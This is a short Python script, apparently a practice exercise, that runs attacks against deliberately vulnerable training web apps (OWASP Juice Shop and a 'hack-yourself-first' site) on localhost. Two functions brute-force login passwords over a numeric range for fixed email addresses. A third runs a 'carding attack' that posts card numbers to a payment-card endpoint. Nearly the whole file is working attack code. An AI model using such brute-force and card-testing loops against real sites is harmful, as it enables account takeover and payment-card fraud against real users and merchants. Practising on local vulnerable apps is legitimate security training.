import requests


def brute_force_attack_password_to_juice_shop():
    #SITE_NAME = 'http://127.0.0.1:5000/#/login'

    for i in range(123450, 123470):
        headers = {"Content-Type": "application/json; charset=utf-8"}
        payload = {'email': 'a@gmail.com', 'password': i}
        session = requests.Session()
        res = session.post('http://localhost:5000/rest/user/login', data=payload,
                           headers=headers)  # TO DO: write into db the password in case of succeed
        print(res.text)


#brute_force_attack_password_to_juice_shop()


def brute_force_attack_password_to_hack_yourself():
    # SITE_NAME = 'https://hack-yourself-first.com/'
    for i in range(123450, 123470):
        headers = {'User-Agent': 'Mozilla/5.0'}
        payload = {'Email': 'hiwedo2878@superyp.com', 'Password': i}

        session = requests.Session()
        # session.keep_alive = False
        res = session.post('http://127.0.0.1:5000/Account/Login', data=payload, headers=headers)
        print(res.text)


# brute_force_attack_password_to_hack_yourself()


def carding_attack_to_juice_shop():  # get all the time good answer
    for i in range(5326102314421000, 5326102314421001):
        headers = {'User-Agent': 'Mozilla/5.0'}
        # payload = {'mat-form-field-label-19': 'Mark Zbikowski', 'mat-form-field-label-21': i, 'mat-input-7': '5',
        #           'mat-input-8': '2080'}
        payload = {'fullName': 'Mark Zbikowski', 'cardNum': i, 'expMonth': '5',
                   'expYear': '2080'}
        session = requests.Session()
        res = session.post('http://localhost:5000/api/Cards/', data=payload, headers=headers)
        print(res.text)


carding_attack_to_juice_shop()
